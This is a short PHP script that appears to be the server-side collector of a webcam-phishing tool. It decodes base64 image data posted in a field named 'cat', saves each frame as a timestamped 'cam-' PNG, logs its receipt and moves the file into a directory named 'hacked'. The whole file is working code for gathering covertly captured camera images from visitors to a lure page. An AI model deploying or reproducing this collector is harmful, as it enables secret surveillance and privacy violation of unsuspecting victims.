<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$filename = 'cam-'.$date.'.png';
$fp = fopen( $filename, 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
rename("./" . $filename, "hacked/$filename");
exit();
?>

